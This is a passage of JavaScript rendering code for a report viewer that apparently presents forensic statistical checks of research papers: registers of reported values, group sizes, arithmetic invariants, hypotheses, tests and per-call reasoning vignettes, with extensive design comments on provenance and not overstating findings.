  const sr=cs.statistics_register||D.statistics_register;
  if(!sr||!Object.keys(sr).length) return '';
  if(sr.error) return '<h3 style="margin-top:18px">The model\'s own register</h3>'
    +'<p class="muted">Validation did not run (<code>'+esc(String(sr.error))
    +'</code>), so nothing here says how much of what the model reported could '
    +'be located in the paper.</p>';
  if(sr.absent) return '<h3 style="margin-top:18px">The model\'s own register</h3>'
    +'<p class="muted">'+esc(sr.note||'No register was emitted by this run.')
    +'</p>';
  const rows=[
    ['rows the model emitted', sr.n_rows],
    ['unique (duplicates removed)', sr.n_unique],
    ['duplicated', sr.n_duplicates],
    ['carrying a checkable tool', sr.n_checkable],
    ['VERIFIED -- quote found in the paper, values in the quote', sr.n_verified],
    ['malformed', sr.n_malformed],
  ].filter(x=>typeof x[1]==='number')
   .map(x=>'<tr><td>'+esc(x[0])+'</td><td class="mono">'+x[1]+'</td></tr>').join('');
  const bs=sr.by_source||{};
  const src=Object.keys(bs).length
    ? '<p class="muted">By source: '+Object.keys(bs).sort()
        .map(k=>esc(k)+' '+bs[k]).join(' &middot; ')+'</p>' : '';
  /* THE PROVENANCE RIDES WITH IT. A register built from quarantined text
     carries values that may be wrong in ways no arithmetic can detect -- a lost
     minus sign reads as an ordinary number -- which is why `register.validate`
     inherits provenance rather than assuming it. */
  const pv=sr.provenance||{};
  const prov=Object.keys(pv).length
    ? '<p class="muted">Read from: '+Object.keys(pv).sort()
        .map(k=>esc(k)+' = '+esc(String(pv[k]))).join(' &middot; ')+'</p>' : '';
  const fl=sr.floor||{};
  /* `n_unmatched` of `n_floor`, which are the keys `register.floor_check`
     actually returns -- I wrote `n_missed` first and it rendered nothing. */
  const floor=(typeof fl.n_unmatched==='number' && typeof fl.n_floor==='number')
    ? '<p class="muted"><b>Against the independent floor:</b> '
      +fl.n_unmatched+' of '+fl.n_floor
      +' statistics the regex enumerator found are NOT in the model\'s register. '
      +esc(fl.note||'')+'</p>'
    : '';
  return '<h3 style="margin-top:18px">The model\'s own register</h3>'
    +'<p class="muted">'+esc(sr.note||'')+'</p>'
    +'<table class="grid"><thead><tr><th>What</th><th>Count</th></tr></thead>'
    +'<tbody>'+rows+'</tbody></table>'+src+prov+floor;
}

/* THE GROUP SIZES THE PAPER PRINTED IN ITS OWN TABLE LABELS.

   `n` gates grim, grimmer, sprite, debit and check_count_percent, and it is
   the whole of the blocked-on-input class -- yet no cell kind emits one, so
   until the register indexed them a reader could see a mean, see GRIM run on
   it, and have nothing to point at for the number that permitted the check.

   Shown apart from the value table on purpose: these are not candidates for a
   check, they are what checks CONSUME, and folding them in would inflate every
   rate computed against the value count. */
function designBlock(r){
  const D=r.design_values||[];
  if(!D.length) return '';
  const rows=D.map(d=>{
    const a=d.anchor||{};
    const occ=(a.occurrences||[]).length;
    const users=(r.groups||[]).filter(g=>(g.design_inputs||[]).indexOf(d.id)>=0);
    return '<tr><td class="mono"><span class="val" data-vid="'+esc(d.id)+'"'
      +' data-rel="'+esc(users.map(g=>(g.values||[]).map(v=>v.id).join(' ')).join(' '))
      +'" title="'+esc(d.id)+'">n = '+esc(String(d.value))+'</span></td>'
      +'<td class="mono">'+esc(a.label||'')+'</td>'
      +'<td>'+esc(String(a.axis||''))+'</td>'
      +'<td>'+occ+' cell'+(occ===1?'':'s')+'</td>'
      +'<td>'+users.length+' group'+(users.length===1?'':'s')+'</td></tr>';
  }).join('');
  /* "As EXTRACTED", not "as printed". The label commonly arrives damaged --
     older Springer PDFs encode `=` as `¼`, so a header the paper printed as
     `Placebo (n = 68)` reaches us as `Placebo (n ¼ 68)`. Showing that under a
     heading claiming it is what the paper printed attributes OUR extraction
     artifact to their typesetting, which is the same conflation this bundle
     refuses everywhere else. The string is still shown verbatim, because a
     reader checking our work needs to see what we actually read. */
  return '<h3 style="margin-top:16px">Group sizes the tables printed</h3>'
    +'<p class="muted">The <code>n</code> each check was measured against. '
    +'Hover one to light up every value it permitted. The label is shown as we '
    +'EXTRACTED it, not as the paper typeset it -- a <code>&#188;</code> for '
    +'<code>=</code> is a known PDF font-encoding artifact of ours.</p>'
    +'<table class="grid"><thead><tr><th>Value</th><th>Label, as extracted</th>'
    +'<th>Where</th><th>Governs</th><th>Used by</th></tr></thead><tbody>'
    +rows+'</tbody></table>';
}

/* WHY EACH UNBOUND ROW IS UNBOUND. An unbound row is the largest coverage
   blocker in the archive -- 275 cells -- and a bare count cannot tell a reader
   "no variable was declared for this row" from "several were and they
   conflict". The second is the common case and the actionable one, and nothing
   is ever bound by guess: candidates that differ in FAMILY differ in which
   checks may run, so choosing between them would be choosing a verdict. */
function invariantsBlock(r){
  /* ARITHMETIC THAT MUST HOLD WHATEVER THE PAPER IS ABOUT. A violation says
     these numbers cannot all be right AS WE READ THEM -- as likely to be our
     extraction as the paper's arithmetic, which is why the quote is shown and
     no verdict is. See `values.check_invariants`. Rendered even when clean,
     because "checked and nothing broke" and "never checked" must not look the
     same. */
  const I=r.invariants; if(!I) return '';
  const parts=['reported','deposited'].map(function(k){
    const s=I[k]; if(!s||!s.n_groups) return '';
    const rules=s.by_rule||{};
    const names=Object.keys(rules);
    if(!names.length) return '<div><b>'+k+'</b>: '+String(s.n_rules_evaluated||0)
      +' rule checks over '+String(s.n_groups)+' value groups, '
      +'<span class="muted">none violated</span></div>';
    const rows=names.map(function(n){
      const ex=((s.examples||{})[n]||[]).map(function(e){
        return '<div class="mono" style="margin-left:14px">'+esc(String(e.quote||''))
          +' <span class="muted">'+esc(JSON.stringify(e.values||{}))+'</span></div>';
      }).join('');
      return '<div style="margin-top:6px">'+esc(n)+' &middot; <b>'+String(rules[n])
        +'</b></div>'+ex;
    }).join('');
    return '<div style="margin-top:8px"><b>'+k+'</b>: '+String(s.n_violations||0)
      +' of '+String(s.n_rules_evaluated||0)+' rule checks violated</div>'+rows;
  }).join('');
  return '<h3 style="margin-top:18px">Arithmetic invariants</h3>'
    +'<p class="muted">'+esc(String(I.note||''))+'</p>'+parts;
}

function unboundBlock(r){
  const U=r.unbound_rows||[];
  if(!U.length) return '';
  const rows=U.map(u=>{
    const cands=(u.candidates||[]).map(c=>'<div><span class="mono">'
      +esc(c.variable_id||'')+'</span> <span class="muted">'+esc(c.family||'?')
      +'</span> &middot; '+esc((c.name||'').slice(0,70))+'</div>').join('')
      || '<span class="muted">none</span>';
    return '<tr><td class="mono">'+esc(u.row_label||'')+'</td>'
      +'<td>'+esc(u.status||'')+'</td><td>'+cands+'</td>'
      +'<td class="muted">'+esc(u.note||'')+'</td></tr>';
  }).join('');
  return '<h3 style="margin-top:18px">Rows with no variable bound ('+U.length+')</h3>'
    +'<table class="grid"><thead><tr><th>Row</th><th>Status</th>'
    +'<th>Could be</th><th>Why not chosen</th></tr></thead><tbody>'
    +rows+'</tbody></table>';
}

/* THE FLOOR UNDER THE FLOOR. The value groups above come from a pattern pass,
   and a shape it has not seen is invisible rather than unclassified -- two such
   shapes were found in one afternoon, worth 5,942 corpus occurrences. This is
   every numeric token in the paper's prose, which cannot be silently
   incomplete, so what the patterns miss is VISIBLE here as `unclassified`. */
function numeralBlock(r){
  const n=r.numerals;
  if(!n||!n.n_total) return '';
  const un=(n.rows||[]).filter(x=>x['class']==='unclassified');
  const by=n.by_class||{};
  const pct=x=>Math.round(100*x/n.n_total)+'%';
  const bars=['statistic','citation_year','ordinal','scale_anchor','unclassified']
    .filter(k=>by[k])
    .map(k=>'<tr><td>'+esc(k.replace(/_/g,' '))+'</td><td class="mono">'
      +by[k]+'</td><td class="muted">'+pct(by[k])+'</td></tr>').join('');
  /* The residue is the actionable half: these are numbers nobody has judged,
     which is the honest state for a number the rules could not name -- not a
     failure, and not something to hide behind a count. */
  /* ANALYTIC FIRST, and the section named. A number in the title block is an
     affiliation superscript and one in the acknowledgements is a grant id;
     neither is a reported statistic, and a reader working down this list
     needs to see that without opening the paper. They are still LISTED --
     the floor stays exhaustive and hiding them would make this a coverage
     claim rather than an inventory. */
  const rank=x=>x.section==='analytic'||!x.section?0:1;
  const ord=un.slice().sort((a,b)=>rank(a)-rank(b));
  const nFurn=un.filter(x=>rank(x)===1).length;
  const list=ord.slice(0,40).map(x=>'<tr><td class="mono">'+esc(x.printed)
    +'</td><td>'+(rank(x)?'<span class="muted">'
      +esc((x.section||'').replace(/_/g,' '))+'</span>':'analytic')
    +'</td><td class="muted">'+esc(x.context||'')+'</td></tr>').join('');
  return '<h3 style="margin-top:18px">Every number in the prose</h3>'
    +'<p class="muted">'+esc(n.note||'')+'</p>'
    +'<table class="grid"><thead><tr><th>What it is</th><th>Count</th>'
    +'<th>Share of '+n.n_total+'</th></tr></thead><tbody>'+bars+'</tbody></table>'
    +(un.length?'<h4 style="margin-top:12px">Not yet judged ('+un.length+')</h4>'
      +(nFurn?'<p class="muted">'+nFurn+' of these sit in the title block or '
        +'the back matter -- affiliation superscripts, grant and approval '
        +'numbers -- and are listed last. They are shown rather than dropped, '
        +'because an inventory that hides what it skipped is a coverage claim.'
        +'</p>':'')
      +'<table class="grid"><thead><tr><th>Printed</th><th>Section</th>'
      +'<th>Context</th></tr>'
      +'</thead><tbody>'+list+'</tbody></table>'
      +(un.length>40?'<p class="muted">'+(un.length-40)+' more in '
        +'value_register.json.</p>':'')
      :'<p class="muted">Every number was judged.</p>');
}

S.push({id:'anatomy', label:'Statistical anatomy', build(){
  const a=D.anatomy||{}, V=a.variables||[], T=a.tests||[], St=a.studies||[];
  const H=a.hypotheses||[];
  if(!V.length&&!T.length) return '<h2>Statistical anatomy</h2><p class="muted">None returned.</p>';
  const byId={}; V.forEach(v=>byId[v.id]=v);
  const ADMITS={binary:'DEBIT; percentage GRIM',count:'GRIM (needs stated max)',
    likert_item:'GRIM, GRIMMER, SPRITE',
    likert_composite:'none -- composite granularity is 1/(items x n)',
    proportion:'percentage GRIM',continuous:'none -- not integer-valued',
    time_to_event:'none -- not integer-valued',rate:'none -- not integer-valued',
    ordinal_category:'percentage GRIM on cell counts',
    nominal_category:'percentage GRIM on cell counts',
    unknown:'none -- variable not typed'};
  /* Values and unit are SEPARATE columns. They are separate fields already --
     `lower_bound`/`upper_bound` and `units` -- and were only ever joined at
     render time, which put "1-5 Likert points" in one cell and left the reader
     to work out where the range stopped and the unit began.

     Nominal levels go one per line, not slash-joined: a forward slash inside a
     category label is indistinguishable from the separator. */
  const anchors=v=>{
    // "1 = Not at all to 5 = Extremely" is the scale's meaning and belongs
    // with the values, not buried in a prose `derived_from`.
    const m=String(v.derived_from||'').match(
      /(\d+)\s*=\s*([A-Za-z][^,;()]{0,24}?)\s*(?:to|-|--|–)\s*(\d+)\s*=\s*([A-Za-z][^,;().]{0,24})/);
    return m?`${m[1]} = ${m[2].trim()} ... ${m[3]} = ${m[4].trim()}`:'';
  };
  const vals=v=>{
    const L=(v.levels||[]).filter(x=>String(x).trim());
    if(L.length) return L.map(x=>esc(x)).join('<br>');
    if(v.lower_bound!=null&&v.upper_bound!=null){
      const sp=(typeof v.lower_bound==='number'&&v.lower_bound<0)?' to ':'-';
      // Integer-only matters: it is the precondition for every granularity
      // check, and "1-5" alone does not say whether 3.5 is possible.
      const disc=String(v.discreteness||'').toLowerCase()==='discrete';
      return esc(v.lower_bound+sp+v.upper_bound)
        +(disc?' <span class="muted">(integers)</span>':'')
        +(anchors(v)?`<br><span class="muted">${esc(anchors(v))}</span>`:'');}
    if(['interval','ratio'].includes(String(v.measurement_level||'').toLowerCase()))
      return '<span class="muted">range not stated</span>';
    return v.n_categories?esc(v.n_categories)+' categories, <span class="muted">not listed</span>'
      :'<span class="muted">not stated</span>';};
  const deriv=v=>{
    const d=String(v.derivation||'').trim(), s=String(v.derived_from||'').trim();
    if(!d||d==='measured') return s?`measured (${s})`:'measured';
    let l=d.replace(/_/g,' ');
    if(v.n_items&&l.includes('item')) l+=` (k=${v.n_items})`;
    return s?`${l}: ${s}`:l;};
  const groups=s=>{
    const g=s.n_per_group||[];
    if(!g.length) return s.n!=null?esc(s.n)+' total':'<span class="muted">not stated</span>';
    return esc(s.n!=null?s.n+' total: ':'')+g.map(x=>esc(x.label)+' '+esc(x.n)).join(', ');};
  /* IVs and DVs per study, derived from the TESTS rather than stored on the
     variable. That is deliberate upstream: a variable is the outcome of one
     model and a covariate in the next, so the role belongs to the test. But a
     reader still wants to know what this study measured and what it predicted
     with, so it is assembled here instead of being asked for again. */
  const vlink=id=>{const v=byId[id]; return v
    ? `<a href="#" onclick="showVar('${esc(id)}');return false">${esc(v.name||id)}</a>`
    : esc(id);};
  const roles=sid=>{
    const mine=T.filter(t=>!t.study_id||t.study_id===sid);
    const dv=[...new Set(mine.map(t=>t.outcome_var).filter(Boolean))];
    const iv=[...new Set(mine.flatMap(t=>t.predictor_vars||[]).filter(Boolean))];
    return {dv,iv};
  };

  /* THE HYPOTHESES WERE EXTRACTED ON EVERY RUN AND SHOWN ON NONE. The anatomy
     is meant to be the inspectable INPUT layer -- what the review believes the
     paper claims, so any finding can be traced back to what it actually saw --
     and its first element is the hypothesis. 16 of the 26 archived runs carry
     a populated `hypotheses` array, complete with the sentence, whether it is
     confirmatory or exploratory, whether it reaches the abstract, and the
     passage it was read from. None of it reached a reader.

     `status` beside `appears_in_abstract` is the pair that matters: an
     EXPLORATORY hypothesis appearing in the abstract is the shape of a result
     written up as though it had been predicted. Stated as two neutral columns,
     not as a flag -- there is no check behind it, and a column a reader can
     draw their own inference from is not the same thing as an accusation. */
  const prov=x=>{
    const q=String(x.provenance_quote||'').trim(); if(!q) return '';
    const v=String(x.provenance_verdict||'');
    const note=v==='verbatim'?'found in the paper'
      :v==='stitched'?'assembled from more than one passage'
      :v==='unverified'?'our search could not locate this text in what we read'
      :v?esc(v):'';
    return `<details><summary class="muted">read from the paper</summary>
      <blockquote>${esc(q)}</blockquote>${
      note?`<p class="muted">${note}</p>`:''}</details>`;
  };
  const yn=v=>v===true?'yes':(v===false?'no':'<span class="muted">not stated</span>');

  return `<h2>Statistical anatomy</h2>
    <p class="muted">${St.length} ${St.length===1?'study':'studies'},
      ${H.length} ${H.length===1?'hypothesis':'hypotheses'},
      ${V.length} variables, ${T.length} tests.</p>
    ${H.length?`<h3>Hypotheses</h3>
      <p class="muted">What this review believes the paper set out to show, with
        the sentence each was read from. This is the input the rest of the
        review reasons over, so it is shown in full rather than summarised: a
        finding can only be trusted as far as the reading of the paper it
        rests on.</p>
      ${tbl(['hypothesis','stated as','in the abstract','confidence','read from'],
        H.map(h=>[esc(h.statement||h.id||''),
          esc(h.status||'')||'<span class="muted">not stated</span>',
          yn(h.appears_in_abstract),
          esc(h.confidence||'')||'<span class="muted">-</span>',
          prov(h)||'<span class="muted">no quote recorded</span>']),{filterFrom:99})}`:''}
    <h3>Studies</h3>
    ${St.map(s=>{const r=roles(s.id); return kv([
      ['description', esc(s.label||s.id)],
      ['design', esc(s.design||'not stated')],
      ['groups compared', groups(s)],
      ['sample flow', (s.sample_flow||[]).length
        ? (s.sample_flow||[]).map(x=>`${esc(x.stage)}: ${esc(x.n)}${
            x.reason?` <span class="muted">(${esc(x.reason)})</span>`:''}`).join('<br>')
        : '<span class="muted">not stated</span>'],
      ['unit of analysis', esc(s.unit_of_analysis||'not stated')],
      ['clustered', s.clustered
        ? 'yes <span class="muted">-- observations are not independent by design</span>'
        : 'no'],
      ['preregistered', s.preregistered===true?'yes'
        :(s.preregistered===false?'no':'<span class="muted">not stated</span>')],
      ['registry id', esc(s.registry_id||'')||'<span class="muted">none</span>'],
      ['measured (DVs)', r.dv.length?r.dv.map(vlink).join(', ')
        :'<span class="muted">no test names an outcome variable</span>'],
      ['predicted with (IVs)', r.iv.length?r.iv.map(vlink).join(', ')
        :'<span class="muted">no test names a predictor</span>'],
    ]);}).join('')}
    <h3>Variables</h3>
    ${tbl(['variable','level','discreteness','values','unit','derived','admits','conf'],
      V.map(v=>[`<span id="var-${esc(v.id)}">${esc(v.name||v.id)}</span>`,
        esc(v.measurement_level||'?'),esc(v.discreteness||'?'),
        vals(v),esc(v.units||'')||'<span class="muted">-</span>',
        esc(deriv(v)),esc(ADMITS[v.family]||v.family||'?'),esc(v.confidence)]))}
    <p class="muted">"admits" is what this typing permits, not what ran. Role
      (outcome / predictor / covariate) is not a column here: a variable is the
      outcome of one model and a covariate in the next, so it belongs to each
      test -- and is summarised per study above.</p>
    <h3>Tests</h3>
    ${tbl(['location','test','outcome (DV)','predictors (IV)','n','statistic','p',
           'effect size','MDE 80%','corrected','assumptions'],
      T.map(t=>{const ov=byId[t.outcome_var]||{};
        const st=St.find(s=>s.id===t.study_id)||St[0]||{};
        const per=(st.n_per_group||[]).map(g=>`${g.label} ${g.n}`).join('; ');
        const none='<span class="muted">-</span>';
        const p = t.p_value==null ? none
          : esc((t.p_is_threshold?'< ':'')+t.p_value);
        return [esc(t.location),esc(t.test_type),
          (t.outcome_var?vlink(t.outcome_var):none)
            +(ov.family?` <span class="muted">(${esc(ov.family)})</span>`:''),
          (t.predictor_vars||[]).map(vlink).join(', ')||none,
          (t.n==null?none:esc(t.n))+(per?`<br><span class="muted">${esc(per)}</span>`:''),
          t.statistic_value==null?none:esc(t.statistic_value),
          p,
          /* EFFECT SIZE: what the paper printed, and -- for the ~69% of rows
             where it printed nothing -- what we computed, visibly marked as
             ours. Merging them would make a number we derived
             indistinguishable from one the authors published. */
          (()=>{const rep=esc(t.effect_size||'');
            const es=t.effect_size_estimated||{};
            const ci=Array.isArray(es.ci95)&&es.ci95.length===2
              ? ` [${(+es.ci95[0]).toFixed(2)}, ${(+es.ci95[1]).toFixed(2)}]` : '';
            const est=(es.value==null)?'':`<span class="muted" title="${esc(
              'estimated by '+(es.tool||'us')+' from '+(es.computed_from||'the printed values')
              )}">est. ${esc((+es.value).toFixed(2))}${esc(ci)}${
              es.kind?' '+esc(es.kind):''}</span>`;
            /* Whether the interval spans the null is the honest version of
               "was this underpowered": a CI from 0.08 to 0.94 says the design
               cannot separate trivial from large, and says it without the
               p-value-in-disguise problem that observed power has. */
            const spans=(es.ci_spans_null===true)
              ? ` <strong class="bad" title="${esc('the interval includes the null value')}">CI spans null</strong>` : '';
            if(rep&&est) return `${rep}<br>${est}${spans}`;
            return (rep||est||none)+(est?spans:'');})(),
          /* DESIGN SENSITIVITY, not observed power. */
          (()=>{const m=t.mde_80||{};
            if(m.value==null) return none;
            const flag=(m.observed_clears_it===false)
              ? ` <strong class="bad" title="${esc('the reported effect is smaller than the smallest this design could reliably detect')}">below MDE</strong>` : '';
            return `<span class="muted">${esc((+m.value).toFixed(2))}</span>${flag}`;})(),
          esc(t.correction_applied||'')||none,
          esc((t.assumption_checks_reported||[]).join(', ')||'none reported')];}))}
    <p class="muted">A row with no statistic, no p and no effect size is one
      where the paper named a test without reporting its result. That is worth
      seeing, not worth hiding.</p>`;
}});

/* Jump to a variable's row from wherever it is named. */
function showVar(id){
  location.hash='anatomy';
  setTimeout(()=>{
    const el=document.getElementById('var-'+id);
    if(el){ el.scrollIntoView({block:'center'});
      el.closest('tr').classList.add('flash');
      setTimeout(()=>el.closest('tr').classList.remove('flash'),1400); }
  },40);
}

S.push({id:'calls', label:'Chain of reasoning', count:()=>(D.calls||[]).length,
  countTitle:()=>'tool calls across both stages, file reads included', build(){
  const c=D.calls||[], names=[...new Set(c.map(x=>x.tool))].sort();
  /* Counted here rather than read from source_coverage.json: this page renders
     the calls themselves, so a count computed from anything else could disagree
     with what the reader is looking at. */
  const able=c.filter(x=>x.sourceable||x.source_quote), quoted=able.filter(x=>x.source_quote);
  const found=quoted.filter(x=>x.source_quote_verified==='verbatim'||x.source_quote_verified==='elided');
  const srcLine=able.length
    ? `<p class="muted"><b>${quoted.length} of ${able.length}</b> checks recorded the
        passage their numbers were read from${quoted.length?`, of which <b>${found.length}</b>
        ${found.length===1?'was':'were'} located in the paper's own text`:''}. The rest
        cite numbers this bundle cannot trace back to the page.</p>`
    : '';
  return `<h2>Chain of reasoning</h2>
    <p class="muted">Every tool call in order, with its inputs and result. A finding not
      backed by a call here was not computed by a validated tool.</p>
    ${srcLine}
    <div style="margin:8px 0"><input type="search" id="cq" placeholder="filter..." size="30">
      <select id="ct"><option value="">all tools (${names.length})</option>${
        names.map(n=>`<option>${esc(n)}</option>`).join('')}</select>
      <span class="muted" id="cc"></span></div>
    <div id="calls">${c.map(callHtml).join('')}</div>`;
}, after(){
  const q=document.getElementById('cq'), t=document.getElementById('ct'), c=document.getElementById('cc');
  const run=()=>{let n=0;
    document.querySelectorAll('#calls details').forEach(el=>{
      const ok=(!q.value||el.dataset.hay.includes(q.value.toLowerCase()))&&(!t.value||el.dataset.tool===t.value);
      el.style.display=ok?'':'none'; if(ok)n++;});
    c.textContent=n+' shown';};
  [q,t].forEach(e=>e&&e.addEventListener('input',run)); run();
}});

/* How a quote's verdict is described. Only `verbatim` and `elided` located the
   text, so only they may make the "as printed" promise -- report_render's
   `_render_quote` draws the same line, for the same reason. `stitched` and
   `unverified` are stated as OUR search failing, because that is what they
   usually are: over 499 findings, hand-adjudication of every unlocated quote
   found no fabrications, only limits of the search (a paper printing
   "Eighty-seven per cent" in words, a raw table header row, a page reference
   read as a decimal). */
const SRC_VERDICT={
  verbatim:['found in the paper','as one contiguous passage'],
  elided:['found in the paper','across an ellipsis; every fragment located'],
  stitched:['NOT found as a passage','every number in it is in the paper, but the words are not contiguous -- read it as a paraphrase'],
  unverified:['NOT located','we could not find this text in what we read; most often our extraction or our search, not the authors'],
};

function sourceHtml(c){
  if(!c.source_quote){
    /* Only for calls that COULD have quoted. An extractor has no reported value
       to source and was never offered the argument; scoring it unsourced would
       report a design decision as a coverage failure on every run. */
    /* SCOPED TO THIS CALL, and the wording has to say so. "cannot be traced to
       the page" was the same over-claim the Overview made in the large: the
       call did not record a passage, which is a fact about the LEDGER ENTRY,
       not a statement that the number is untraceable -- the finding it feeds
       usually quotes the paper and was usually located verbatim. */
    return c.sourceable
      ? `<p class="muted" style="margin:0 0 8px">This call did not record the passage
           its numbers were read from. The finding it supports may still quote the
           paper -- see that finding rather than concluding the number is
           untraceable.</p>`
      : '';
  }
  const v=SRC_VERDICT[c.source_quote_verified]||null;
  const where=c.source_quote_source?' in '+esc(c.source_quote_source):'';
  const tail=v?`<span class="muted">${esc(v[0])}${where} -- ${esc(v[1])}</span>`
             :'<span class="muted">quoted by the review; not checked against the paper</span>';
  const loc=c.source_locator?` <span class="muted">(${esc(c.source_locator)})</span>`:'';
  return `<div style="margin:0 0 8px"><b class="muted">Read from</b>${loc}
    <blockquote style="margin:2px 0 2px 12px">${esc(c.source_quote)}</blockquote>
    ${tail}</div>`;
}

/* WHAT FAILED AS PRINTED, BEFORE A CONVENTION EXPLAINED IT.

   GREG, 2026-08-11: "we do the test on only those numbers available, flag it,
   and then test truncation etc. That way the reader can see the apparent
   violation (i.e. our toolkit working) but then judge for themselves whether
   the truncation etc is credible."

   A check that failed under the usual convention and passes under another one
   returns `consistent`, and that de-escalation is right -- a truncating
   reporter or a population SD is a house style, not fabrication. What was wrong
   is that it left the reader NOTHING TO JUDGE. The arithmetic was in the raw
   result blob, which is to say nowhere.

   Deliberately NOT styled as a finding: no severity chip, no accusation colour.
   It is the working, shown. The number that decides how much it is worth is
   `how_often_that_excuse_is_available` -- an explanation available for 14% of
   values at this n is specific, one available for 100% is not, and the reader
   cannot weigh the claim without it. */
function asReportedHtml(a){
  if(!a) return '';
  const pct=typeof a.how_often_that_excuse_is_available==='number'
    ? Math.round(a.how_often_that_excuse_is_available*100) : null;
  return `<div class="asrep">
    <b>As printed, this did not check out.</b>
    <p>${esc(a.statement||'')}</p>
    ${a.severity_if_taken_at_face_value
      ? `<p class="muted">Taken at face value that would be
          <b>${esc(a.severity_if_taken_at_face_value)}</b>.</p>`:''}
    ${a.explanation?`<p><b>What explains it:</b> ${esc(a.explanation)}</p>`:''}
    ${a.why_we_will_not_call_it
      ? `<p><b>Why we will not call it either way:</b>
          ${esc(a.why_we_will_not_call_it)}</p>`:''}
    ${pct!==null?`<p class="muted">That explanation is available for about
      <b>${pct}%</b> of values at this sample size and precision${
      pct>=90?' -- which is to say, for almost any number, so it explains little':
      ''}.</p>`:''}
    ${a.judge_for_yourself?`<p class="muted">${esc(a.judge_for_yourself)}</p>`:''}
  </div>`;
}

/* A check that could not have failed is not a check that passed. */
function powerHtml(p){
  if(!p || p.check_can_fail===undefined) return '';
  if(p.check_can_fail && !p.rescue_is_an_off_switch) return '';
  return `<div class="asrep"><b>This check had no resolution here.</b>
    <p class="muted">At n = ${esc(String(p.n))} with ${esc(String(p.decimals))}
      decimal place${p.decimals===1?'':'s'},
      ${p.check_can_fail
        ? 'every value that fails the usual rounding convention passes under the other one'
        : 'every printable value is attainable'},
      so no reported figure could have failed. A pass here would be true and
      empty; it is reported as undecided instead.</p></div>`;
}

/* THE VIGNETTE: one call, five parts, followable on its own.

   WHAT THIS REPLACED. Every call rendered as `Input` and `Result`, two JSON
   dumps. A `grimmer_check` result is 19 keys of which a reader needs four, and
   runs to 24 across the archive; `get_table` reaches 29. It held everything
   and communicated almost nothing -- and it is the ONLY surface in this bundle
   where an individual check can be inspected, so "unreadable" and "absent"
   were nearly the same thing.

   GREG, 2026-08-09, framing the unit: what we asked, what the paper said, what
   the tool computed, what that means, and what would change the answer.

   THE PARTS ARE DATA, from `vignette.PARTS`, and the prose in them is composed
   in `vignette.py`. This function is presentation only -- the rule two design
   reviews of this viewer landed on independently, and the one `viewer_facts`
   exists to enforce after three JS-authored claims about our own work turned
   out to be measurably false on a real bundle.

   RAW STILL SHIPS, one click below every vignette and byte-identical to what
   it always was. A rendering a reader cannot check against the record is a
   rendering they have to take on trust, which is the opposite of the point. */
function vigPartHtml(key, c){
  const v=c.vignette||{};
  if(key==='asked')    return vigAskedHtml(v.asked||{});
  if(key==='paper')    return vigPaperHtml(v.paper||{}, c);
  if(key==='computed') return vigComputedHtml(v.computed||{}, c);
  if(key==='means')    return vigMeansHtml(v.means||{}, c);
  if(key==='changes')  return vigChangesHtml(v.changes||[]);
  return '';
}

function vigAskedHtml(a){
  const args=(a.values||[]).map(x=>`<li><code>${esc(x.name)}</code> =
    <b>${esc(x.value)}</b> <span class="r">-- ${esc(x.role)}</span></li>`).join('');
  return `<p>${esc(a.question||'')}</p>${
    args?`<ul class="vargs">${args}</ul>`
        :`<p class="muted">This call was made with no arguments.</p>`}`;
}

/* Delegates the quote to `sourceHtml`, which already renders it WITH the
   verification verdict and already draws the distinction between a check that
   recorded no passage and a tool that was never offered the argument. A second
   renderer here would be a second wording of the most consequential caveat in
   the document. */
function vigPaperHtml(p, c){
  if(p.state==='not_offered') return `<p class="muted">${esc(p.note||'')}</p>`;
  return sourceHtml(c);
}

function vigComputedHtml(k, c){
  if(k.headline) return `<p><b>${esc(k.headline)}</b></p>${
    k.detail?`<pre>${esc(k.detail)}</pre>`:''}`;
  const nums=(k.figures||[]).map(f=>
    `<span><b>${esc(f.name)}</b> ${esc(f.value)}</span>`).join('');
  return `<p>Verdict: ${k.verdict?sev(k.verdict)
      :'<span class="muted">none -- this call returns data, not a judgement</span>'}</p>
    ${k.method?`<p>${esc(k.method)}</p>`
              :`<p class="muted">This check recorded no description of its own
                 method. That is a gap in the tool's output, not a sign it did
                 less work.</p>`}
    ${k.detail?`<p>${esc(k.detail)}</p>`:''}
    ${nums?`<div class="vnums">${nums}</div>`:''}
    ${k.n_more?`<p class="muted">${esc(k.n_more)} further field${k.n_more===1?'':'s'}
       of this result ${k.n_more===1?'is':'are'} not shown here;
       ${k.n_more===1?'it is':'every one of them is'} in the raw result
       below.</p>`:''}
    ${asReportedHtml(c.as_reported)}`;
}

function vigMeansHtml(m, c){
  return `<p>${esc(m.scope||'')}</p>
    ${m.unvalidated?`<p class="muted">${esc(m.unvalidated)}</p>`:''}
    ${m.evidence?`<p class="muted"><b>${esc(m.evidence)}</b> evidence.
      ${esc(m.evidence_meaning||'')}</p>`:''}
    ${m.ceiling?`<p class="muted">Strongest verdict this check may reach:
      ${sev(m.ceiling)}</p>`:''}
    ${powerHtml(c.discriminating_power)}`;
}

/* NEVER EMPTY, and that is a property of `vignette._changes` rather than a
   hope: its last lever is unconditional, because every verdict on this page is
   a verdict about numbers somebody read off a page, and a mis-read makes
   impeccable arithmetic into a statement about a number the paper does not
   contain. If this branch ever renders, the composer is broken and says so. */
function vigChangesHtml(levers){
  if(!levers.length) return `<p class="muted">No lever was composed for this call.
    That is a defect in this renderer -- every verdict rests on something.</p>`;
  return levers.map(l=>`<div class="vlev"><b>${esc(l.lever)}</b>
    <p>${esc(l.detail||'')}${l.card
      ? ` <a href="#" data-cb="cb-tool-${esc(l.card)}">See what this check can conclude</a>.`
      : ''}</p></div>`).join('');
}

function callHtml(c){
  const inp=JSON.stringify(c.input||{},null,1);
  const parts=(D.vignette_parts||[]).map(p=>
    `<div class="vpart"><h5>${esc(p.label)}</h5>${vigPartHtml(p.key,c)}</div>`).join('');
  return `<details data-tool="${esc(c.tool)}" data-hay="${esc((c.tool+' '+inp+' '+(c.result||'')).toLowerCase())}">
    <summary><span class="muted">${esc(DN(c.stage))} #${esc(c.seq)}</span>
      <b>${esc(c.tool)}</b> ${sev(c.severity)}${
      c.is_error?' <span class="asrep-chip">call failed</span>':''}${
      c.as_reported?' <span class="asrep-chip">failed as printed</span>':''}${
      c.validated===false?' <span class="muted">(unvalidated surface)</span>':''}</summary>
    <div class="vig" style="padding:0 0 10px">${parts}
      <details><summary class="muted">The record this was built from</summary>
        <b class="muted">Input</b><pre>${esc(inp)}</pre>
        <b class="muted">Result</b><pre>${esc(c.result||'')}</pre></details>
      </div></details>`;
}

/* WHAT EACH CHECK MAY CONCLUDE, one entry per check this run names.

   This is the answer to the question a reader of a forensic report most needs
   answered and could not answer anywhere in this document: when it says
